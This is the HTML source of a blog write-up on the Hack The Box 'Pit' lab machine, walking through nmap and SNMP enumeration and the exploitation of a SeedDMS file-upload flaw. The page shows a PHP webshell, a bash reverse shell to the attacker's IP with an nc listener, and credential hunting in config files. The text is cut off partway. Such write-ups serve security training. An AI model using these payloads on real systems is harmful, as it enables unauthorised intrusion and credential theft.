<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Pit | Ef's log</title><meta name=keywords content="HackTheBox,CTF,Computer Security,Cyber Security,Pentesting"><meta name=description content="As a medium difficulty box, Pit from Hack The Box has a well-designed enumeration flow."><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/hackthebox/pit/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Pit"><meta property="og:description" content="As a medium difficulty box, Pit from Hack The Box has a well-designed enumeration flow."><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/pit/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/pit/imgs/image-20211013111002486.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2021-10-13T16:54:04+07:00"><meta property="article:modified_time" content="2021-10-13T16:54:04+07:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/pit/imgs/image-20211013111002486.png"><meta name=twitter:title content="HackTheBox - Pit"><meta name=twitter:description content="As a medium difficulty box, Pit from Hack The Box has a well-designed enumeration flow."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Pit","item":"https://fahmifj.github.io/hackthebox/pit/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Pit","name":"HackTheBox - Pit","description":"As a medium difficulty box, Pit from Hack The Box has a well-designed enumeration flow.","keywords":["HackTheBox","CTF","Computer Security","Cyber Security","Pentesting"],"articleBody":"As a medium difficulty box, Pit from Hack The Box has a well-designed enumeration flow. It starts by enumerating SNMP to reveal a username and a hidden web path to a CMS called SeedDMS, where I can login with that username. The CMS is vulnerable to a remote code execution, allowing me to obtain a database password that I can then use on a Cockpit instance. Enumerating the system from Cockpit’s terminal reveals that each time a “walk” is performed, SNMP will execute a script. This script basically searches for and executes other scripts in a specific directory to which I have write access, allowing me to create a malicious script in there to gain root access.\nSkills Learned SNMP enumeration and exploitation SeedDMS exploitation Cockpit exploitation Tools Nmap snmpwalk gobuster Reconnaissance Nmap TCP For TCP ports, nmap discovers 3 open ports: SSH on port 22, an NGINX web server on port 80, and a service that nmap identifies it as zeus-admin.\n→ root@kali «pit» «10.10.14.49» $ nmap -p- --max-rate 1000 -sV --reason -oA nmap/10-tcp-allport-pit 10.10.10.241 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-20 11:03 EDT Nmap scan report for 10.10.10.241 Host is up, received echo-reply ttl 63 (0.079s latency). Not shown: 65532 filtered ports Reason: 65332 no-responses and 200 admin-prohibiteds PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0) 80/tcp open http syn-ack ttl 63 nginx 1.14.1 9090/tcp open ssl/zeus-admin? syn-ack ttl 63 ...[SNIP]... Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 401.69 seconds → root@kali «pit» «10.10.14.49» $ nmap -p22,80,9090 --max-rate 1000 -sC -oA nmap/10-tcp-defaultsc-pit 10.10.10.241 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-20 11:12 EDT Nmap scan report for 10.10.10.241 Host is up (0.16s latency). PORT STATE SERVICE 22/tcp open ssh | ssh-hostkey: | 3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA) | 256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA) |_ 256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519) 80/tcp open http |_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux 9090/tcp open zeus-admin | ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US | Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1 | Not valid before: 2020-04-16T23:29:12 |_Not valid after: 2030-06-04T16:09:12 |_ssl-date: TLS randomness does not represent time Nmap done: 1 IP address (1 host up) scanned in 4.39 seconds Also, nmap revealed a domain name dms-pit.htb from the SSL certificate on port 9090. I will add it to my /etc/hosts file\n→ root@kali «pit» «10.10.14.49» $ echo '10.10.10.241 dms-pit.htb pit.htb' \u003e\u003e /etc/hosts UDP For UDP ports, nmap discovers an SNMP server on port 161 and reveals a domain name pit.htb.\n→ root@kali «pit» «10.10.14.49» $ nmap -sU -sV -n --top-ports 20 -oA nmap/10-udp-top20-pit 10.10.10.241 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-20 11:18 EDT Nmap scan report for 10.10.10.241 Host is up (0.074s latency). PORT STATE SERVICE VERSION 53/udp open|filtered domain 67/udp open|filtered dhcps 68/udp filtered dhcpc 69/udp open|filtered tftp 123/udp open|filtered ntp 135/udp open|filtered msrpc 137/udp open|filtered netbios-ns 138/udp filtered netbios-dgm 139/udp open|filtered netbios-ssn 161/udp open snmp SNMPv1 server; net-snmp SNMPv3 server (public) 162/udp open|filtered snmptrap 445/udp filtered microsoft-ds 500/udp open|filtered isakmp 514/udp filtered syslog 520/udp open|filtered route 631/udp open|filtered ipp 1434/udp open|filtered ms-sql-m 1900/udp filtered upnp 4500/udp open|filtered nat-t-ike 49152/udp open|filtered unknown Service Info: Host: pit.htb Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.21 seconds Poking the websites For HTTP, it seems only dms-pit.htb that serves different content.\n→ root@kali «pit» «10.10.14.49» $ curl -s http://10.10.10.241/ | wc -c 4057 → root@kali «pit» «10.10.14.49» $ curl -s http://pit.htb/ | wc -c 4057 → root@kali «pit» «10.10.14.49» $ curl -s http://dms-pit.htb/ | wc -c 169 For HTTPS on port 9090, it’s all the same site.\n→ root@kali «pit» «10.10.14.49» $ curl -s -k https://10.10.10.241:9090/ | wc -c 43548 → root@kali «pit» «10.10.14.49» $ curl -s -k https://pit.htb:9090/ | wc -c 43548 → root@kali «pit» «10.10.14.49» $ curl -s -k https://dms-pit.htb:9090/ | wc -c 43548 Enumeration TCP 80 - Website On port 80, a NGINX default web page for REHL is shown here.\nRunning gobuster against this site doesn’t really find something useful, and I couldn’t find a critical vulnerability on nginx 1.14.1.\nTCP 80 - dms-pit.htb Heading to dms-pit.htb on port 80 shows a 403 forbidden error message.\nFor this site, gobuster actually found some files, but all of them returned with 403 status.\nTCP 9090 - Website (HTTPS) On port 9090, there is a login page.\nThis page was identified as an instance of Cockpit, a web-based interface for system administration.\nSearchsploit There is a security issue on GitHub which talks about SSRF:\nhttps://github.com/cockpit-project/cockpit/issues/15077 The researcher disclosed the issue in his blog.\nhttps://docs.unsafe-inline.com/0day/cokpit-version-234-server-side-request-forgery-cve-2020-35850 The researcher also provides a PoC, but it requires an account, so I will move on to the next service.\nUDP 161 - SNMP From what nmap gave, I assume that this machine supports SNMPv1-SNMPv3. Based on what I read on HackTricks, to enumerate SNMP version 1/2c, I need to know the community string name, and there are two types of it: public and private.\nThe public community string normally grants read access, however private may grant you read/write access, even leading to remote code execution.\nFor SNMP version 1 and 2c, it is possible to identify a valid community string based on the server’s response with a dictionary attack (brute) . In Kali, there is a preinstalled tool for this, which I will use called onesixtyone. I will run it and save the output to a file.\n→ root@kali «pit» «10.10.14.49» $ onesixtyone -c /opt/SecLists/Discovery/SNMP/snmp.txt 10.10.10.241 \u003e snmp-enum/brute-community-strings The attack reveals that public is a valid community string.\n→ root@kali «pit» «10.10.14.49» $ cat snmp-enum/brute-community-strings Scanning 1 hosts, 3220 communities 10.10.10.241 [public] Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64 10.10.10.241 [public] Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64 Now to enumerate SNMP, I will use another preinstalled tool called snmpwalk. Using this tool will return a list of OID (Objects Identifiers) which consists a set of numbers separated by dot, so to translate these numbers into a bit meaningful, I will need snmp-mibs-downloader. I will install that with:\n→ root@kali «pit» «10.10.14.49» $ apt-get install snmp-mibs-downloader The general usage for snmpwalk is:\n$ snmpwalk [OPTIONS] AGENT [OID] Actually, I did a lot of enumeration with SNMP, but because OID is a hierarchical structure, I found that it was easier to start from the Internet OID, which is 1.3.6.1, so that it would “walk” down to any readable OID branch, it is something like 1.3.6.1 -\u003e 1.3.6.1.1 (directory OID) -\u003e … -\u003e 1.3.6.1.4 (private OID) -\u003e … -\u003e 1.3.6.1.X.X.\nI will run snmpwalk on that and save the output to snmp-internet-1.3.6.1.out.\n→ root@kali «pit» «10.10.14.49» $ snmpwalk -v 2c -c public 10.10.10.241 internet \u003e snmp-internet-1.3.6.1.out -v 2c: SNMP version 2c. SNMP version 1 and 2c sends data in clear-text while version 3 uses auth. -c public: community string internet: auto translated to 1.3.6.1 by snmp-mibs-downloader I will filter the output with hrSWRunParameters (Host Resources Software Run Parameters), which might leak some sensitive information from the command line arguments of the current running processes, but it doesn’t have any.\n→ root@kali «pit» «10.10.14.49» $ cat snmp-enum/snmp-internet-1.3.6.1.out | grep \"hrSWRunParameters\" | grep STRING HOST-RESOURCES-MIB::hrSWRunParameters.1 = STRING: \"--switched-root --system --deserialize 17\" HOST-RESOURCES-MIB::hrSWRunParameters.1000 = STRING: \"--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only\" HOST-RESOURCES-MIB::hrSWRunParameters.1001 = STRING: \"--foreground\" HOST-RESOURCES-MIB::hrSWRunParameters.1002 = STRING: \"--no-debug\" HOST-RESOURCES-MIB::hrSWRunParameters.1004 = STRING: \"-s\" HOST-RESOURCES-MIB::hrSWRunParameters.1009 = STRING: \"-i --logger=files\" HOST-RESOURCES-MIB::hrSWRunParameters.1011 = STRING: \"-f --fill-watermark=0\" HOST-RESOURCES-MIB::hrSWRunParameters.1041 = STRING: \"--domain implicit_files --uid 0 --gid 0 --logger=files\" HOST-RESOURCES-MIB::hrSWRunParameters.1051 = STRING: \"--uid 0 --gid 0 --logger=files\" HOST-RESOURCES-MIB::hrSWRunParameters.1056 = STRING: \"-s /usr/sbin/firewalld --nofork --nopid\" HOST-RESOURCES-MIB::hrSWRunParameters.1090 = STRING: \"--no-daemon\" HOST-RESOURCES-MIB::hrSWRunParameters.1101 = STRING: \"-D -oCiphers=aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256-ctr,aes256-cbc,aes128-gcm@openssh.com,aes128-ctr,aes128\" HOST-RESOURCES-MIB::hrSWRunParameters.1105 = STRING: \"-Es /usr/sbin/tuned -l -P\" HOST-RESOURCES-MIB::hrSWRunParameters.1116 = STRING: \"-n\" HOST-RESOURCES-MIB::hrSWRunParameters.1193 = STRING: \"-o -p -- \\\\u --noclear tty1 linux\" HOST-RESOURCES-MIB::hrSWRunParameters.1208 = STRING: \"--basedir=/usr\" HOST-RESOURCES-MIB::hrSWRunParameters.1479 = STRING: \"-n\" HOST-RESOURCES-MIB::hrSWRunParameters.1481 = STRING: \"-LS0-6d -f\" HOST-RESOURCES-MIB::hrSWRunParameters.10212 = STRING: \"-Es /usr/share/setroubleshoot/SetroubleshootFixit.py\" If I examine the entire output carefully, the two most interesting information are:\nA web path /var/www/html/seeddms51x/seeddms, and A potential username: michelle UCD-SNMP-MIB::dskPath.2 = STRING: /var/www/html/seeddms51x/seeddms UCD-SNMP-MIB::dskDevice.1 = STRING: /dev/mapper/cl-root UCD-SNMP-MIB::dskDevice.2 = STRING: /dev/mapper/cl-seeddms ...[SNIP]... NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1 NET-SNMP-EXTEND-MIB::nsExtendCommand.\"monitoring\" = STRING: /usr/bin/monitor NET-SNMP-EXTEND-MIB::nsExtendArgs.\"monitoring\" = STRING: NET-SNMP-EXTEND-MIB::nsExtendInput.\"monitoring\" = STRING: NET-SNMP-EXTEND-MIB::nsExtendCacheTime.\"monitoring\" = INTEGER: 5 NET-SNMP-EXTEND-MIB::nsExtendExecType.\"monitoring\" = INTEGER: exec(1) NET-SNMP-EXTEND-MIB::nsExtendRunType.\"monitoring\" = INTEGER: run-on-read(1) NET-SNMP-EXTEND-MIB::nsExtendStorage.\"monitoring\" = INTEGER: permanent(4) NET-SNMP-EXTEND-MIB::nsExtendStatus.\"monitoring\" = INTEGER: active(1) NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.\"monitoring\" = STRING: Memory usage NET-SNMP-EXTEND-MIB::nsExtendOutputFull.\"monitoring\" = STRING: Memory usage total used free shared buff/cache available Mem: 3.8Gi 415Mi 3.0Gi 16Mi 452Mi 3.2Gi Swap: 1.9Gi 0B 1.9Gi Database status OK - Connection to database successful. System release info CentOS Linux release 8.3.2011 SELinux Settings user Labeling MLS/ MLS/ SELinux User Prefix MCS Level MCS Range SELinux Roles guest_u user s0 s0 guest_r root user s0 s0-s0:c0.c1023 staff_r sysadm_r system_r unconfined_r staff_u user s0 s0-s0:c0.c1023 staff_r sysadm_r unconfined_r sysadm_u user s0 s0-s0:c0.c1023 sysadm_r system_u user s0 s0-s0:c0.c1023 system_r unconfined_r unconfined_u user s0 s0-s0:c0.c1023 system_r unconfined_r user_u user s0 s0 user_r xguest_u user s0 s0 xguest_r login Login Name SELinux User MLS/MCS Range Service __default__ unconfined_u s0-s0:c0.c1023 * michelle user_u s0 * root unconfined_u s0-s0:c0.c1023 * System uptime 14:03:52 up 12:03, 0 users, load average: 0.04, 0.01, 0.00 NET-SNMP-EXTEND-MIB::nsExtendOutNumLines.\"monitoring\" = INTEGER: 31 NET-SNMP-EXTEND-MIB::nsExtendResult.\"monitoring\" = INTEGER: 0 NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".1 = STRING: Memory usage NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".2 = STRING: total used free shared buff/cache available NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".3 = STRING: Mem: 3.8Gi 415Mi 3.0Gi 16Mi 452Mi 3.2Gi NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".4 = STRING: Swap: 1.9Gi 0B 1.9Gi NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".5 = STRING: Database status NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".6 = STRING: OK - Connection to database successful. NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".7 = STRING: System release info NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".8 = STRING: CentOS Linux release 8.3.2011 NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".9 = STRING: SELinux Settings NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".10 = STRING: user NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".11 = STRING: NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".12 = STRING: Labeling MLS/ MLS/ NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".13 = STRING: SELinux User Prefix MCS Level MCS Range SELinux Roles NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".14 = STRING: NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".15 = STRING: guest_u user s0 s0 guest_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".16 = STRING: root user s0 s0-s0:c0.c1023 staff_r sysadm_r system_r unconfined_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".17 = STRING: staff_u user s0 s0-s0:c0.c1023 staff_r sysadm_r unconfined_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".18 = STRING: sysadm_u user s0 s0-s0:c0.c1023 sysadm_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".19 = STRING: system_u user s0 s0-s0:c0.c1023 system_r unconfined_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".20 = STRING: unconfined_u user s0 s0-s0:c0.c1023 system_r unconfined_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".21 = STRING: user_u user s0 s0 user_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".22 = STRING: xguest_u user s0 s0 xguest_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".23 = STRING: login NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".24 = STRING: NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".25 = STRING: Login Name SELinux User MLS/MCS Range Service NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".26 = STRING: NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".27 = STRING: __default__ unconfined_u s0-s0:c0.c1023 * NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".28 = STRING: michelle user_u s0 * NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".29 = STRING: root unconfined_u s0-s0:c0.c1023 * NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".30 = STRING: System uptime NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".31 = STRING: 14:03:52 up 12:03, 0 users, load average: 0.04, 0.01, 0.00 NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"monitoring\".31 = No more variables left in this MIB View (It is past the end of the MIB tree) I will also notice that some of the output lines starting with NET-SNMP-EXTEND-MIB are similar to the output from some Linux command utilities such as uptime and free -h.\nSeedDMS (TCP 80) From the enumeration above, a web directory was revealed at /var/www/html/seeddms51x/seeddms by snmpwalk. Since the directory path contains a “dms” string, I tried to append the path name to http://dms-pit.htb.\nAnd then when I enter http://dms-pit.htb/seeddms51x/seeddms, it redirects me to a login page.\nA quick search for “SeedDMS” on Google pops this link. It states that SeedDMS is:\nA free document management system with an easy to use web based user interface for small and medium sized enterprises. It is based on PHP and MySQL or sqlite3 and runs on Linux, MacOS and Windows. Many years of development has made it a mature, powerful and enterprise ready platform for sharing and storing documents.\nGobuster This time gobuster reveals some accessible items.\n→ root@kali «pit» «10.10.14.49» $ gobuster dir -u http://dms-pit.htb/seeddms51x/seeddms/ -x txt,php -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/dms-pit.htb-seeddms-M-80 -t 10 -b 403,404 -r =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://dms-pit.htb/seeddms51x/seeddms/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt [+] Negative Status codes: 403,404 [+] User Agent: gobuster/3.1.0 [+] Extensions: txt,php [+] Follow Redirect: true [+] Timeout: 10s =============================================================== 2021/05/20 15:13:54 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 7359] /CHANGELOG (Status: 200) [Size: 101652] /LICENSE (Status: 200) [Size: 18321] /TODO (Status: 200) [Size: 2844] /Guests.php (Status: 502) [Size: 173] /GuideImages.php (Status: 502) [Size: 173] /HB.php (Status: 502) [Size: 173] /HDRS.php (Status: 502) [Size: 173] =============================================================== 2021/05/20 15:22:45 Finished =============================================================== Poking /CHANGELOG with curl reveals the software version.\n→ root@kali «pit» «10.10.14.49» $ curl -s http://dms-pit.htb/seeddms51x/seeddms/CHANGELOG | head -------------------------------------------------------------------------------- Changes in version 5.1.15 -------------------------------------------------------------------------------- - Improved import from file system - HTTP Proxy for access on external extension repository can be set - Do not use unzip in ExtensionMgr anymore - fix version compare on info page - allow one page mode on search page - fix import of older extension versions from repository Searchsploit I feed the version to searchsploit, and it returns with some potential exploits. There is one for RCE.\n→ root@kali «pit» «10.10.14.49» $ searchsploit seeddms --------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------- --------------------------------- SeedDMS 5.1.18 - Persistent Cross-Site Scripting | php/webapps/48324.txt SeedDMS \u003c 5.1.11 - 'out.GroupMgr.php' Cross-Site Scripting | php/webapps/47024.txt SeedDMS \u003c 5.1.11 - 'out.UsrMgr.php' Cross-Site Scripting | php/webapps/47023.txt SeedDMS versions \u003c 5.1.11 - Remote Command Execution | php/webapps/47022.txt --------------------------------------------------------------------------- --------------------------------- The exploitation steps for the RCE vulnerability is as follow:\nExploit Title: [Remote Command Execution through Unvalidated File Upload in SeedDMS versions \u003c5.1.11] # Google Dork: [NA] # Date: [20-June-2019] # Exploit Author: [Nimit Jain](https://www.linkedin.com/in/nimitiitk)(https://secfolks.blogspot.com) # Vendor Homepage: [https://www.seeddms.org] # Software Link: [https://sourceforge.net/projects/seeddms/files/] # Version: [SeedDMS versions \u003c5.1.11] (REQUIRED) # Tested on: [NA] # CVE : [CVE-2019-12744] Exploit Steps: Step 1: Login to the application and under any folder add a document. Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used. PHP Backdoor Code: \u003c?php if(isset($_REQUEST['cmd'])){ echo \"\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"\"; die; } ?\u003e Step 3: Now after uploading the file check the document id corresponding to the document. Step 4: Now go to example.com/data/1048576/\"document_id\"/1.php?cmd=cat+/etc/passwd to get the command response in browser. Note: Here \"data\" and \"1048576\" are default folders where the uploaded files are getting saved. I will need a valid credentials for RCE.\nFoothold Shell as nginx SeedDMS Dashboard admin:admin are the default credentials for SeedDMS.\nBut these creds didn’t work here, so I submit michelle:michelle, and it logs me in 😮 !\nSeedDMS CVE-2019-12744 With a valid account, I can try to reproduce the exploitation steps for remote code execution.\nFirst, I will create a document by navigating to Docs \u003e Users \u003e Michelle (folders), and then under michelle folder I will add a new document.\nOn the local file menu, I will browse and upload my PHP web shell.\nAnd the file gets uploaded.\nAccording to the exploit author, the uploaded web shell should be available at http://dms-pit.htb/seeddms51x/seeddms/data/1048576/63/1.php?f=id, where 63 is my document ID, but I couldn’t find it there.\n→ root@kali «pit» «10.10.14.49» $ curl -s 'http://dms-pit.htb/seeddms51x/seeddms/data/1048576/63/1.php?f=id' File not found. The web server somehow has a weird routing, so I downloaded the SeedDMS source code to figure out its folder structure, and it was on http://dms-pit.htb/seeddms51x/data/1048576/64/1.php?f=id!\nReverse Shell I will send a bash reverse shell to get a foothold on the box.\n/bin/bash -c \"/bin/bash -i \u003e\u0026 /dev/tcp/10.10.14.49/53 0\u003e\u00261\" On my listener:\n→ root@kali «exploits» «10.10.14.49» $ nc -nvlp 53 listening on [any] 53 ... connect to [10.10.14.49] from (UNKNOWN) [10.10.10.241] 58888 bash: cannot set terminal process group (26319): Inappropriate ioctl for device bash: no job control in this shell bash-4.4$ id id uid=992(nginx) gid=988(nginx) groups=988(nginx) context=system_u:system_r:httpd_t:s0 \u003e\u003e I just read and watched other writeups, and they were unable to get a foothold. Not sure why, but I did.\nPrivilege Escalation Shell as michelle Enumeration Searching for string “pass” under /var/www/html/seeddms51x/conf reveals the database credentials.\nbash-4.4$ pwd pwd /var/www/html/seeddms51x/conf bash-4.4$ grep -Ri \"pass\" ...[SNIP]... settings.xml: ","wordCount":"3146","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/pit/imgs/image-20211013111002486.png","datePublished":"2021-10-13T16:54:04+07:00","dateModified":"2021-10-13T16:54:04+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/pit/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Pit</h1><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>October 13, 2021</span>&nbsp;&#183;&nbsp;<span class=meta-read>15 min read</span></div><hr></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li><li><a href=#poking-the-websites aria-label="Poking the websites">Poking the websites</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-80---website aria-label="TCP 80 - Website">TCP 80 - Website</a></li><li><a href=#tcp-80---dms-pithtb aria-label="TCP 80 - dms-pit.htb">TCP 80 - dms-pit.htb</a></li><li><a href=#tcp-9090---website-https aria-label="TCP 9090 - Website (HTTPS)">TCP 9090 - Website (HTTPS)</a></li><li><a href=#udp-161---snmp aria-label="UDP 161 - SNMP">UDP 161 - SNMP</a></li><li><a href=#seeddms-tcp-80 aria-label="SeedDMS (TCP 80)">SeedDMS (TCP 80)</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-nginx aria-label="Shell as nginx">Shell as nginx</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-michelle aria-label="Shell as michelle">Shell as michelle</a></li><li><a href=#shell-as-root aria-label="Shell as 